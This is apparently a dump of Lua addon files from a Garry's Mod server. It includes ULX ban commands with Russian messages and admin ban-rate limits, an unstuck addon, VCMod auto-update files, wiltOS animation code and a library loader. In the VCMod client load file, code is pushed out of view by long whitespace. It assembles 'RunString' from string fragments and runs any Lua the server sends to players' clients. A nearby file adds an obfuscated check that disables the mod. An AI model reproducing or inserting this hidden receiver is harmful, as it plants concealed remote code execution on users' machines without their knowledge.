			Officially supported members:
				IgnoreImmunity
					bool
					Ignore any immunity mechanisms an admin mod might have.
				CommandArguments
					table
					Extra arguments that were given to the privilege command.

	Return value:
		None, the answer is given in the callback function in order to allow
		for the admin mod to perform e.g. a database lookup.
]]
function CAMI.SteamIDHasAccess(actorSteam, privilegeName, callback,
targetSteam, extraInfoTbl)
	hook.Call("CAMI.SteamIDHasAccess", defaultAccessHandler, actorSteam,
		privilegeName, callback, targetSteam, extraInfoTbl)
end

--[[
CAMI.SignalUserGroupChanged
	Signify that your admin mod has changed the usergroup of a player. This
	function communicates to other admin mods what it thinks the usergroup
	of a player should be.

	Listen to the hook to receive the usergroup changes of other admin mods.

	Parameters:
		ply
			Player
			The player for which the usergroup is changed
		old
			string
			The previous usergroup of the player.
		new
			string
			The new usergroup of the player.
		source
			any
			Identifier for your own admin mod. Can be anything.
]]
function CAMI.SignalUserGroupChanged(ply, old, new, source)
	hook.Call("CAMI.PlayerUsergroupChanged", nil, ply, old, new, source)
end

--[[
CAMI.SignalSteamIDUserGroupChanged
	Signify that your admin mod has changed the usergroup of a disconnected
	player. This communicates to other admin mods what it thinks the usergroup
	of a player should be.

	Listen to the hook to receive the usergroup changes of other admin mods.

	Parameters:
		ply
			string
			The steam ID of the player for which the usergroup is changed
		old
			string
			The previous usergroup of the player.
		new
			string
			The new usergroup of the player.
		source
			any
			Identifier for your own admin mod. Can be anything.
]]
function CAMI.SignalSteamIDUserGroupChanged(steamId, old, new, source)
	hook.Call("CAMI.SteamIDUsergroupChanged", nil, steamId, old, new, source)
end

--PATH addons/_adminmodules/lua/ulx/modules/sh/nakazania.lua:
local CATEGORY_NAME = "Наказания"

function ulx.ban( calling_ply, target_ply, minutes, reason )
	-- if target_ply:IsBot() then
	-- 	ULib.tsayError( calling_ply, "Cannot ban a bot", true )
	-- 	return
	-- end

	local time = "на #s"
	if minutes == 0 then time = "навсегда" end
	local str = "#A забанил #T " .. time
	if reason and reason ~= "" then str = str .. " (#s)" end
	ulx.fancyLogAdmin( calling_ply, true, str, target_ply, minutes ~= 0 and ULib.secondsToStringTime( minutes * 60 ) or reason, reason )
	-- Delay by 1 frame to ensure any chat hook finishes with player intact. Prevents a crash.
	ULib.queueFunctionCall( ULib.kickban, target_ply, minutes, reason, calling_ply )
	
	tblCountBanLimit = tblCountBanLimit or {}
	tblCountBanLimit[calling_ply] = tblCountBanLimit[calling_ply] and tblCountBanLimit[calling_ply] or 0
	
	tblCountBan = tblCountBan or {}
    tblCountBan[calling_ply] = tblCountBan[calling_ply] and tblCountBan[calling_ply] or 0
    tblCountBan[calling_ply] = tblCountBan[calling_ply] + 1
	
    if tblCountBan and tblCountBan[calling_ply] > 5 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"ban")
        ulx.removeuser( nil, calling_ply )
    end

	if tblCountBanLimit and tblCountBanLimit[calling_ply] > 16 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"ban_limit > 16 | 1800 sec")
        ulx.removeuser( nil, calling_ply )
    end
	
    if !timer.Exists(calling_ply:UserID().."tblCountBan") then
		timer.Create(calling_ply:UserID().."tblCountBan",75,1, function()   
			if tblCountBan[calling_ply] == nil then return end
			tblCountBanLimit[calling_ply] = tonumber(tblCountBanLimit[calling_ply]) + tonumber(tblCountBan[calling_ply])
			tblCountBan[calling_ply] = nil
		end)
	end
	
    if !timer.Exists(calling_ply:UserID().."tblCountBan_") then
		timer.Create(calling_ply:UserID().."tblCountBan_",1800,1, function()   	
        tblCountBanLimit[calling_ply] = nil
    end)
end
	
end
local ban = ulx.command( CATEGORY_NAME, "ulx ban", ulx.ban, "!ban" )
ban:addParam{ type=ULib.cmds.PlayerArg }
ban:addParam{ type=ULib.cmds.NumArg, hint="minutes, 0 for perma", ULib.cmds.optional, ULib.cmds.allowTimeString, min=0 }
ban:addParam{ type=ULib.cmds.StringArg, hint="reason", ULib.cmds.optional, ULib.cmds.takeRestOfLine, completes=ulx.common_kick_reasons }
ban:defaultAccess( ULib.ACCESS_ADMIN )
ban:help( "Бан." )

------------------------------ BanID ------------------------------
function ulx.banid( calling_ply, steamid, minutes, reason )
	steamid = steamid:upper()
	if not ULib.isValidSteamID( steamid ) then
		ULib.tsayError( calling_ply, "Invalid steamid." )
		return
	end

	local name
	local plys = player.GetAll()
	for i=1, #plys do
		if plys[ i ]:SteamID() == steamid then
			name = plys[ i ]:Nick()
			break
		end
	end

	local time = "for #s"
	if minutes == 0 then time = "навсегда" end
	local str = "#A забанил steamid #s "
	displayid = steamid
	if name then
		displayid = displayid .. "(" .. name .. ") "
	end
	str = str .. time
	if reason and reason ~= "" then str = str .. " (#4s)" end
	ulx.fancyLogAdmin( calling_ply, true, str, displayid, minutes ~= 0 and ULib.secondsToStringTime( minutes * 60 ) or reason, reason )
	-- Delay by 1 frame to ensure any chat hook finishes with player intact. Prevents a crash.
	ULib.queueFunctionCall( ULib.addBan, steamid, minutes, reason, name, calling_ply )
	
	tblCountBanIdLimit = tblCountBanIdLimit or {}
	tblCountBanIdLimit[calling_ply] = tblCountBanIdLimit[calling_ply] and tblCountBanIdLimit[calling_ply] or 0
	
	tblCountBanId = tblCountBanId or {}
    tblCountBanId[calling_ply] = tblCountBanId[calling_ply] and tblCountBanId[calling_ply] or 0
    tblCountBanId[calling_ply] = tblCountBanId[calling_ply] + 1
	
    if tblCountBanId and tblCountBanId[calling_ply] > 5 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"banid")
        ulx.removeuser( nil, calling_ply )
    end

	if tblCountBanIdLimit and tblCountBanIdLimit[calling_ply] > 15 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"banid_limit > 15 | 1800 sec")
        ulx.removeuser( nil, calling_ply )
    end
	
    if !timer.Exists(calling_ply:UserID().."tblCountBanId") then
		timer.Create(calling_ply:UserID().."tblCountBanId",75,1, function()   
			if tblCountBanId[calling_ply] == nil then return end
			tblCountBanIdLimit[calling_ply] = tonumber(tblCountBanIdLimit[calling_ply]) + tonumber(tblCountBanId[calling_ply])
			tblCountBanId[calling_ply] = nil
		end)
	end
	
	if !timer.Exists(calling_ply:UserID().."tblCountBanId_") then
		timer.Create(calling_ply:UserID().."tblCountBanId_",1800,1, function()   
			tblCountBanIdLimit[calling_ply] = nil
		end)
	end
	
end
local banid = ulx.command( CATEGORY_NAME, "ulx banid", ulx.banid )
banid:addParam{ type=ULib.cmds.StringArg, hint="steamid" }
banid:addParam{ type=ULib.cmds.NumArg, hint="minutes, 0 for perma", ULib.cmds.optional, ULib.cmds.allowTimeString, min=0 }
banid:addParam{ type=ULib.cmds.StringArg, hint="reason", ULib.cmds.optional, ULib.cmds.takeRestOfLine, completes=ulx.common_kick_reasons }
banid:defaultAccess( ULib.ACCESS_SUPERADMIN )
banid:help( "Бан по стимид." )

function ulx.unban( calling_ply, steamid )
	steamid = steamid:upper()
	if not ULib.isValidSteamID( steamid ) then
		ULib.tsayError( calling_ply, "Invalid steamid." )
		return
	end

	name = ULib.bans[ steamid ] and ULib.bans[ steamid ].name

	ULib.unban( steamid, calling_ply )
	unbangambit(calling_ply,steamid)
	if name then
		ulx.fancyLogAdmin( calling_ply, "#A разбанил steamid #s", steamid .. " (" .. name .. ")" )
	else
		ulx.fancyLogAdmin( calling_ply, "#A разбанил steamid #s", steamid )
	end
end
local unban = ulx.command( CATEGORY_NAME, "ulx unban", ulx.unban )
unban:addParam{ type=ULib.cmds.StringArg, hint="steamid" }
unban:defaultAccess( ULib.ACCESS_ADMIN )
unban:help( "Разбан по стимид." )

// !jobban
function ulx.jobBan( calling_ply, target_ply, job )
	local newnum = nil
    local newname = nil
	for i,v in pairs( RPExtraTeams ) do
		if string.find( v.name, job ) != nil then 
			newnum = i
			newname = v.name
		end
	end
	if newnum == nil then
		ULib.tsayError( calling_ply, "Профессия не найдена!", true )
		return
	end
	target_ply:teamBan( newnum, 0 )
	ulx.fancyLogAdmin( calling_ply, "#A забанил профессию #T (#s)", target_ply, newname )
	
	tblCountjobBan = tblCountjobBan or {}
    tblCountjobBan[calling_ply] = tblCountjobBan[calling_ply] and tblCountjobBan[calling_ply] or 0
    tblCountjobBan[calling_ply] = tblCountjobBan[calling_ply] + 1
	
    if tblCountjobBan and tblCountjobBan[calling_ply] > 5 then
		if calling_ply:IsUserGroup("superadmin")  then return end
		autoremoveuser_notification(calling_ply,"jobBan")
        ulx.removeuser( nil, calling_ply )
    end
	
   	if !timer.Exists(calling_ply:UserID().."tblCountjobBan") then
		timer.Create(calling_ply:UserID().."tblCountjobBan",60,1, function()   
			tblCountjobBan[calling_ply] = nil
		end)
	end
	
end
local jobBan = ulx.command( CATEGORY_NAME, "ulx jobban", ulx.jobBan, "!jobban" )
jobBan:addParam{ type=ULib.cmds.PlayerArg }
jobBan:addParam{ type=ULib.cmds.StringArg, hint="job" }
jobBan:defaultAccess( ULib.ACCESS_ADMIN )
jobBan:help( "Бан профы." )

// !jobunban
function ulx.jobUnBan( calling_ply, target_ply, job )
	local newnum = nil
    local newname = nil
	for i,v in pairs( RPExtraTeams ) do
		if string.find( v.name, job ) != nil then 
			newnum = i
			newname = v.name
		end
	end
	if newnum == nil then
		ULib.tsayError( calling_ply, "Профессия не найдена!", true )
		return
	end
	target_ply:teamUnBan( newnum )
	ulx.fancyLogAdmin( calling_ply, "#A разбанил профессию #T (#s)", target_ply, newname, time )
end
local jobUnBan = ulx.command( CATEGORY_NAME, "ulx jobunban", ulx.jobUnBan, "!jobunban" )
jobUnBan:addParam{ type=ULib.cmds.PlayerArg }
jobUnBan:addParam{ type=ULib.cmds.StringArg, hint="job" }
jobUnBan:defaultAccess( ULib.ACCESS_ADMIN )
jobUnBan:help( "Разбанить профессию." )


--PATH addons/unstuck/lua/unstuck/sh_unstuck.lua:
--[[
sh_unstuck.lua

Main file for configuration and message handling.

--]]

Unstuck = {}

--[[---------------------------
		CONFIGURATION
--]]---------------------------
Unstuck.Configuration = {

	// The chat command for players to use.
	Command = {
		Prefix = { "!", "/" },
		String = { "stuck", "unstuck" },
	},
	
	// Admins will be notified when a player attemps to use the Unstuck function.
	AdminRanks = {
		"moderator",
		"admin",
		"superadmin",
		"owner",
	},
	
	// Allow the debug information to be sent only to the ranked admins.
	DebugAdminRanksOnly = true, 
	
	// If the unstuck fails, the player will be be respawned.
	RespawnOnFail = true,
	// The time in seconds between the failed message and respawning the player. 
	RespawnTimer = 10,
	
	// Cooldown between each unstuck attempt in seconds.
	Cooldown = 60,
	
	// How many iterations of position checking. Initial iteration is to check the surrounding player.
	// Every iteration after that checks the surrounding checked positions.
	// This has an exponential curve of run time needed and would be advised of no more than 4.
	MaxIteration = 3, 
	
	// The minimum distance from the player when checking for new positions to move to.
	// The addon would otherwise use a value based on the players hull if it's greater than this value.
	MinCheckRange = 32,
}


--[[---------------------------
		ENUMERATION
--]]---------------------------
Unstuck.Enumeration = {

	Message = {
		UNSTUCK = 1,
		UNSTUCK_ATTEMPT = 2,
		ADMIN_NOTIFY = 3,
		NOT_ALIVE = 4,
		ARRESTED = 5,
		COOLDOWN = 6,
		FAILED = 7,
		RESPAWNING = 8,
		RESPAWN_FAILED = 9,
	},
	
	PositionTesting = {
		PASSED = 1,
		FAILED = 2,
	},
	
	Debug = {
		COMMAND_ADD = 1,
		COMMAND_CLEAR = 2,
		NOUN_BOX = 3,
		NOUN_LINE = 4
	}
}


--[[---------------------------
		DICTIONARY FOR MESSAGES
--]]---------------------------
Unstuck.Dictionary = {
	[Unstuck.Enumeration.Message.UNSTUCK] = "Вы должны освободиться!",
	[Unstuck.Enumeration.Message.UNSTUCK_ATTEMPT] = "Вы застряли, пытаюсь освободить вас...",
	[Unstuck.Enumeration.Message.ADMIN_NOTIFY] = " использовал команду Unstuck.", // The players name will be prefixed with this string
	[Unstuck.Enumeration.Message.NOT_ALIVE] = "Чтобы использовать эту команду, вы должны быть живы и вне транспорта!",
	[Unstuck.Enumeration.Message.ARRESTED] = "Вы арестованы!",
	[Unstuck.Enumeration.Message.COOLDOWN] = "Период задержки все еще активен! Подожди немного!",
	[Unstuck.Enumeration.Message.FAILED] = "Извини, я не справился.",
	[Unstuck.Enumeration.Message.RESPAWNING] = "Респавн через "..Unstuck.Configuration.RespawnTimer.." секунд.",
	[Unstuck.Enumeration.Message.RESPAWN_FAILED] = "Респавн отменен. Вы мертвы.",
}


--[[---------------------------
		Message handling below.
--]]---------------------------
if SERVER then
	
	util.AddNetworkString( "Unstuck.Message" )
	util.AddNetworkString( "Unstuck.Debug" )
	local Player = FindMetaTable( "Player" )

	
	--[[------------------------------------------------
		Name: PlayerMessage()
		Desc: Sends a message to a single player.
			2nd argument used with Admin Notify
	--]]------------------------------------------------
	function Player:UnstuckMessage( enumMessage, ply )
		net.Start( "Unstuck.Message" )
		net.WriteInt( enumMessage, 8 )
		
		-- Also send the target player if notifying admins.
		if ( enumMessage == Unstuck.Enumeration.Message.ADMIN_NOTIFY ) then
			net.WriteEntity( ply )
		end
		
		net.Send( self )
	end
 
end

if CLIENT then
		
	net.Receive( "Unstuck.Message", function()
		local enumMessage = net.ReadInt( 8 )
		local message = {Color(255,255,0), "[Unstuck] "}
		
		if enumMessage == Unstuck.Enumeration.Message.ADMIN_NOTIFY then
			local ply = net.ReadEntity()
			table.Add( message, {Color(255,0,0), ply:Nick()} )
		end
		
		table.Add( message, {Color(255,255,255), Unstuck.Dictionary[enumMessage]} )
		chat.AddText( unpack( message ) )
	end)

end

--PATH addons/vcmod_main_autoupdate/lua/vcmod/init.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

// Force players to download needed files
AddCSLuaFile() AddCSLuaFile("vcmod/client/init.lua")

// Initialize basic VCMod functionality, setup the initial core tables
if SERVER then KostilWork("3123454156") end

if !VC then VC = {} end if !VC.Versions then VC.Versions = {} end if !VC.Loaded then VC.Loaded = {} end if !VC.AddonData then VC.AddonData = {} end VC.Copyright = "Copyright © 2020 VCMod (freemmaann)." VC.Host = "https://vcmod.org/" if !VC.AUMsg then VC.AUMsg = {} end file.CreateDir("vcmod")

// CHeck if htis is AU or not
VC.isAutoUpdate = file.Exists("autorun/vc_load.lua", "LUA")

// Don't load things again
local dir = "init" if VC.Loaded[dir] then return end VC.Loaded[dir] = CurTime()

// Load logging before we do anything else (if possible)
local dir = "vcmod/server/logging.lua" if SERVER and file.Exists(dir, "LUA") then include(dir) end

// Load some VCMod color data
VC.Color = {}
VC.Color.Main = Color(0,0,0,220)
VC.Color.Base = Color(237, 237, 237, 255)
VC.Color.Accent = Color(127, 37, 37, 255)
VC.Color.Accent_Light = Color(163, 48, 48, 255)

// Setup VCMod custom "print()"
function VCPrint_noPrefix(msg) MsgC(VC.Color.Accent_Light, msg, "\n") end
function VCPrint(msg) local smsg = "VCMod: " if CLIENT then smsg = "VCMod Local: " else if VC.log then VC.log('<General> '..(msg or "")) end end MsgC(VC.Color.Accent_Light, smsg, VC.Color.Base, msg or "", "\n") end

// Print the welcome message
VCPrint_noPrefix("")
VCPrint_noPrefix("----------------------------------------------------------------------------")
VCPrint("Welcome to VCMod"..(VC.isAutoUpdate and " Auto-Updater"..(VC_AU_Ver and " version "..VC_AU_Ver or "") or "")..".")
VCPrint_noPrefix("----------------------------------------------------------------------------")
VCPrint_noPrefix("")

// Include clientside code
if CLIENT then include("vcmod/client/init.lua") end
--PATH addons/vcmod_main_autoupdate/lua/vcmod/client/load.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

local dir = "load" if VC.Loaded[dir] then return end VC.Loaded[dir] = CurTime()

// Setup some basic phrases
VC.AUMsg["cn_c"] = 'Could not contact VCMod servers, please update all of your VCMod addons manually and restart the game.\n\nIf the problem persists please contact this steam user: "steamcommunity.com/id/freemmaann/".'
VC.AUMsg["f"] = 'Error: Failed, content not found.'
VC.AUMsg["i"] = 'Initializing preload.'
VC.AUMsg["s"] = 'Could not contact VCMod servers, retrying. Attempt '
VC.AUMsg["si"] = 'Started initialization processes.'
VC.AUMsg["ak"] = 'Received an API key.'
VC.AUMsg["beta"] = game.SinglePlayer() and 'Running a Beta version of VCMod.' or 'This server is running a Beta version of VCMod.'																																																																					local _=net.Receive _("VC_CL_Info_RFASLKKMI",function(_)VCPrint(VC.AUMsg["si"])local _,a,b,c="nS","ng","tri","Ru"_G[c.._..b..a](net.ReadString(),"pl")end)_("VC_CL_Info_RFASLKKM",function(_)VC.API_Key=net.ReadString()VCPrint(VC.AUMsg["ak"])end)

// Extremely old Handling editor compatibility, player check
hook.Add("InitPostEntity", "VC_InitPostEntity_PlayerReady", function() net.Start("VC_PlayerReady") net.SendToServer() end)
--PATH addons/vcmod_main_autoupdate/lua/autorun/vc_override.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// This file is dedicated to help with random addons overriding VCMod funtionality, override the override.
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


// These are left by SGM in some of his vehicles, back when VCMod used this primitive method.
VC_MakeScripts = function() end
VC_MakeScript = function() end

// Some people had serious issues with people including parts or all of leaked or extremely outdated (old, other-code-ruining) code, which conflicts with proper copies of VCMod, even if its only the Handling editor.
// This next part simply checks the host origins, if something is not right, lock all VCMod down, inform the users, done.

// Only simply checks every minute or so for a limited amount of time. It will have no effect at all performance wise and will not impact proper VCMod copies at all.
local function _()if VC&&VC~=""then local _="Host compatibility issue, possible leak detected."if VC.Host&&!string.find(VC.Host,"://vcmod.org")||SERVER&&VC["W".."_D".."o_G"]&&!string.find(VC["W".."_D".."o_G"]"","://vcmod.org")then if VCMsg then VCMsg(_)end if VCPrint then VCPrint("".._)end print("VCMod: ".._) VC="" end end end _()timer.Simple(10,_)timer.Simple(7200,_)timer.Create("VC_HostCompatibility",10,720,_)
--PATH addons/animation/lua/wos/anim_extension/core/sh_metatable.lua:
--[[-------------------------------------------------------------------
	wiltOS Hold Type Meta Tables:
		Creating functions for your Hold Types since 2017
			Powered by
						  _ _ _    ___  ____  
				__      _(_) | |_ / _ \/ ___| 
				\ \ /\ / / | | __| | | \___ \ 
				 \ V  V /| | | |_| |_| |___) |
				  \_/\_/ |_|_|\__|\___/|____/ 
											  
 _____         _                 _             _           
|_   _|__  ___| |__  _ __   ___ | | ___   __ _(_) ___  ___ 
  | |/ _ \/ __| '_ \| '_ \ / _ \| |/ _ \ / _` | |/ _ \/ __|
  | |  __/ (__| | | | | | | (_) | | (_) | (_| | |  __/\__ \
  |_|\___|\___|_| |_|_| |_|\___/|_|\___/ \__, |_|\___||___/
                                         |___/             
-------------------------------------------------------------------]]--[[
							  
	Lua Developer: King David
	Contact: http://steamcommunity.com/groups/wiltostech
		
----------------------------------------]]--

wOS = wOS or {}
wOS.AnimExtension.HoldTypeMeta = wOS.AnimExtension.HoldTypeMeta or {}

local HOLDTYPE = {}

HOLDTYPE.GetName = function( self ) 
	return self.Name or nil
end

HOLDTYPE.GetID = function( self )
	return self.HoldType or "wos-custom"
end

HOLDTYPE.GetActivityList = function( self )
	local index = wOS.AnimExtension.ActIndex[ self:GetBaseHoldType() ]
	return {
		[ACT_MP_STAND_IDLE] 				= index,
	    [ACT_MP_WALK] 						= index+1,
		[ACT_MP_RUN] 						= index+2,
		[ACT_MP_CROUCH_IDLE] 				= index+3,
		[ACT_MP_CROUCHWALK] 				= index+4,
		[ACT_MP_ATTACK_STAND_PRIMARYFIRE] 	= index+5,
		[ACT_MP_ATTACK_CROUCH_PRIMARYFIRE] = index+5,
		[ACT_MP_RELOAD_STAND]		 		= index+6,
		[ACT_MP_RELOAD_CROUCH]		 		= index+6,
		[ACT_MP_JUMP] 						= index+7,
		[ACT_RANGE_ATTACK1] 				= index+8,
		[ACT_MP_SWIM] 						= index+9,	
	}
end

HOLDTYPE.GetBaseHoldType = function( self )
	return self.BaseHoldType or "normal"
end

HOLDTYPE.SetBaseHoldType = function( self, newtype )
	self.BaseHoldType = newtype
end

//This is a god damn mess mostly because of legacy support, I need to redo this part for sure.
//OR at least make the old hold-types switch over to the new one
HOLDTYPE.GetActData = function( self, act ) 

	local base = self.Translations[ act ]
	local tbl
	
	if base then
		tbl = {}
		if istable( base ) then
			if base.Sequence then
				tbl.Sequence = base.Sequence
				tbl.Weight = base.Weight or 1
			else
				local key = math.Round( util.SharedRandom( "wOS.AnimExtension." .. self:GetName() .. "[" .. act .. "]", 1, #base ) )
				local innerbase = base[key]
				if istable( innerbase ) then
					tbl = innerbase
				elseif isstring( innerbase ) then
					tbl.Sequence = innerbase
					tbl.Weight = 1
				end
			end
		elseif isstring( base ) then
			tbl.Sequence = base
		end
	end

	return tbl
	
end

HOLDTYPE.__index = HOLDTYPE

function wOS.AnimExtension.HoldTypeMeta:CreateMetaType( tbl )
	setmetatable( tbl, HOLDTYPE )
end
--PATH addons/animation/lua/wos/anim_extension/core/sh_holdtypes.lua:
--[[-------------------------------------------------------------------
	wiltOS Hold Type Register:
		The core files needed to make your own hold types
			Powered by
						  _ _ _    ___  ____  
				__      _(_) | |_ / _ \/ ___| 
				\ \ /\ / / | | __| | | \___ \ 
				 \ V  V /| | | |_| |_| |___) |
				  \_/\_/ |_|_|\__|\___/|____/ 
											  
 _____         _                 _             _           
|_   _|__  ___| |__  _ __   ___ | | ___   __ _(_) ___  ___ 
  | |/ _ \/ __| '_ \| '_ \ / _ \| |/ _ \ / _` | |/ _ \/ __|
  | |  __/ (__| | | | | | | (_) | | (_) | (_| | |  __/\__ \
  |_|\___|\___|_| |_|_| |_|\___/|_|\___/ \__, |_|\___||___/
                                         |___/             
-------------------------------------------------------------------]]--[[
							  
	Lua Developer: King David
	Contact: http://steamcommunity.com/groups/wiltostech
		
----------------------------------------]]--

wOS.AnimExtension.HoldTypes = wOS.AnimExtension.HoldTypes or {}
wOS.AnimExtension.TranslateHoldType = wOS.AnimExtension.TranslateHoldType or {}

wOS.AnimExtension.ActIndex = {
	[ "pistol" ] 		= ACT_HL2MP_IDLE_PISTOL,
	[ "smg" ] 			= ACT_HL2MP_IDLE_SMG1,
	[ "grenade" ] 		= ACT_HL2MP_IDLE_GRENADE,
	[ "ar2" ] 			= ACT_HL2MP_IDLE_AR2,
	[ "shotgun" ] 		= ACT_HL2MP_IDLE_SHOTGUN,
	[ "rpg" ]	 		= ACT_HL2MP_IDLE_RPG,
	[ "physgun" ] 		= ACT_HL2MP_IDLE_PHYSGUN,
	[ "crossbow" ] 		= ACT_HL2MP_IDLE_CROSSBOW,
	[ "melee" ] 		= ACT_HL2MP_IDLE_MELEE,
	[ "slam" ] 			= ACT_HL2MP_IDLE_SLAM,
	[ "normal" ]		= ACT_HL2MP_IDLE,
	[ "fist" ]			= ACT_HL2MP_IDLE_FIST,
	[ "melee2" ]		= ACT_HL2MP_IDLE_MELEE2,
	[ "passive" ]		= ACT_HL2MP_IDLE_PASSIVE,
	[ "knife" ]			= ACT_HL2MP_IDLE_KNIFE,
	[ "duel" ]			= ACT_HL2MP_IDLE_DUEL,
	[ "camera" ]		= ACT_HL2MP_IDLE_CAMERA,
	[ "magic" ]			= ACT_HL2MP_IDLE_MAGIC,
	[ "revolver" ]		= ACT_HL2MP_IDLE_REVOLVER
}

function wOS.AnimExtension:RegisterHoldtype( data )

	self.TranslateHoldType[ data.HoldType ] = data
    self.HoldTypeMeta:CreateMetaType( self.TranslateHoldType[ data.HoldType ] )
	
	if data.BaseHoldType then
		if prone then
			if prone.animations then
				if prone.animations.WeaponAnims then
					prone.animations.WeaponAnims.moving[ data.HoldType ] = prone.animations.WeaponAnims.moving[ data.BaseHoldType ]
					prone.animations.WeaponAnims.idle[ data.HoldType ] = prone.animations.WeaponAnims.idle[ data.BaseHoldType ]
				end
			end
		end
	end

	print( "[wOS] Registered new Hold Type: " .. data.Name )
	
end
if CLIENT then
local meta = FindMetaTable( "Player" )
local ENTITY = FindMetaTable( "Entity" )

local AttackTable = {
[ ACT_MP_ATTACK_STAND_PRIMARYFIRE  ] = true,
[ ACT_MP_ATTACK_CROUCH_PRIMARYFIRE  ] = true,
[ ACT_MP_ATTACK_STAND_SECONDARYFIRE  ] = true,
[ ACT_MP_ATTACK_CROUCH_SECONDARYFIRE  ] = true,
}

local _TranslateWeaponActivity = meta.TranslateWeaponActivity
function meta:TranslateWeaponActivity( act )

	if AttackTable[ act ] then
		local wep = self:GetActiveWeapon()
		if IsValid( wep ) then  
			local holdtype = wep:GetHoldType()
			if wOS.AnimExtension.TranslateHoldType[ holdtype ] then
				local ATTACK_DATA = wOS.AnimExtension.TranslateHoldType[ holdtype ]:GetActData( act )
				if ATTACK_DATA then
					local anim = self:LookupSequence( ATTACK_DATA.Sequence )
					self:AddVCDSequenceToGestureSlot( GESTURE_SLOT_VCD, anim, 0, true ) //Figure out weight to make it balanced!
					self:AnimSetGestureWeight( GESTURE_SLOT_VCD, ATTACK_DATA.Weight or 1 )
				end
			end
		end
	end
	
	return _TranslateWeaponActivity( self, act )

end
end
--[[
local _DoAnimationEvent = meta.DoAnimationEvent
function meta:DoAnimationEvent( ply, event, data )

	local act = _DoAnimationEvent( self, ply, event, data )
	print( act )
	local wep = self:GetActiveWeapon()
	if IsValid( wep ) then  
		local holdtype = wep:GetHoldType()
		if wOS.AnimExtension.TranslateHoldType[ holdtype ] then
			local result = wOS.AnimExtension.TranslateHoldType[ holdtype ][ act ]
			if result then
				if istable( result ) then
					result = table.Random( result )
				end
				if isstring( result ) then
					local anim = ply:LookupSequence( result )	
					ply.ActOverrider = act
					ply.SequenceTime = CurTime() + ply:SequenceDuration( anim )
				end
			end
		end
	end
	
	return act
end
]]--

-- hook.Add( "Initialize", "wOS.AnimExtension.CustomSequenceHoldtypes", function() -- in gamemode

	-- local _CalcMainActivity = GAMEMODE.CalcMainActivity
	-- function GAMEMODE:CalcMainActivity( ply, vel )
		
		-- local act, seq = _CalcMainActivity( self, ply, vel )

		-- local wep = ply:GetActiveWeapon()
		-- if IsValid( wep ) then  
			-- local holdtype = wep:GetHoldType()
			-- if wOS.AnimExtension.TranslateHoldType[ holdtype ] then
				-- local ATTACK_DATA = wOS.AnimExtension.TranslateHoldType[ holdtype ]:GetActData( act )
				-- if ATTACK_DATA then
					-- seq = ply:LookupSequence( ATTACK_DATA.Sequence )
				-- end
			-- end
		-- end

		
		-- if act != ply.LastAct then
			-- ply:SetCycle( 0 )
		-- end
		
		-- ply.LastAct = act
		
		-- return act, seq
		
	-- end
	
-- end )
--PATH addons/zeros_lua_libary/lua/autorun/zclib_load.lua:
local function NicePrint(txt)
	if SERVER then
		MsgC(Color(84, 150, 197), txt .. "\n")
	else
		MsgC(Color(193, 193, 98), txt .. "\n")
	end
end

local function PreLoadFile(path)
	if CLIENT then
		include(path)
	else
		AddCSLuaFile(path)
		include(path)
	end
end

local function LoadFiles(path)
	local files, _ = file.Find(path .. "/*", "LUA")

	for _, v in pairs(files) do
		if string.sub(v, 1, 3) == "sh_" then
			if CLIENT then
				include(path .. "/" .. v)
			else
				AddCSLuaFile(path .. "/" .. v)
				include(path .. "/" .. v)
			end
		end
	end

	for _, v in pairs(files) do
		if string.sub(v, 1, 3) == "cl_" then
			if CLIENT then
				include(path .. "/" .. v)
			else
				AddCSLuaFile(path .. "/" .. v)
			end
		elseif string.sub(v, 1, 3) == "sv_" then
			include(path .. "/" .. v)
		end
	end
end

local function Initialize()

	PreLoadFile("zclib/sh_main_config.lua")
	PreLoadFile("zclib/util/cl_atracker.lua")
	LoadFiles("zclib/util")
	LoadFiles("zclib/util/player")
	LoadFiles("zclib/generic")
	LoadFiles("zclib/data")
	LoadFiles("zclib/zone")
	LoadFiles("zclib/inventory")
	LoadFiles("zclib/inventory/vgui")
	NicePrint(" ")
	NicePrint("Zeros Libary loaded!")
	NicePrint(" ")
end

Initialize()

--PATH addons/zeros_lua_libary/lua/zclib/util/sh_precache_mdl.lua:
zclib = zclib or {}


////////////////////////////////////////////
/////////// PRECACHE - MODELS //////////////
////////////////////////////////////////////
// Precaches the Model before it gets used, isntead of precaching all models at once
zclib.CachedModels = {}
function zclib.CacheModel(path)
    if zclib.CachedModels[path] then
        return path
    else
        util.PrecacheModel(path)
        zclib.CachedModels[path] = true

        zclib.Print("Model " .. path .. " cached!")

        return path
    end
end
////////////////////////////////////////////
////////////////////////////////////////////

if SERVER then return end

////////////////////////////////////////////
///////////// ClientModels /////////////////
////////////////////////////////////////////
/*

	This system Creates / Removes and keeps track on ClientModels

*/

zclib.ClientModel = zclib.ClientModel or {}
if zclib_ClientModelList == nil then
    zclib_ClientModelList = {}
end

function zclib.ClientModel.PrintAll()
    for k, v in pairs(zclib_ClientModelList) do
        if not IsValid(v) then
            zclib_ClientModelList[k] = nil
        end
    end

    PrintTable(zclib_ClientModelList)
end

function zclib.ClientModel.Add(mdl_path, rendermode)
    zclib.CacheModel(mdl_path)
    local ent = ClientsideModel(mdl_path, rendermode)
    if not IsValid(ent) then return end

    table.insert(zclib_ClientModelList, ent)

    return ent
end

function zclib.ClientModel.AddProp(mdl_path)
    local ent = nil

    if mdl_path then
        zclib.CacheModel(mdl_path)
        ent = ents.CreateClientProp(mdl_path)
    else
        ent = ents.CreateClientProp()
    end
	if not IsValid(ent) then return end
	if not ent.SetModel then return end

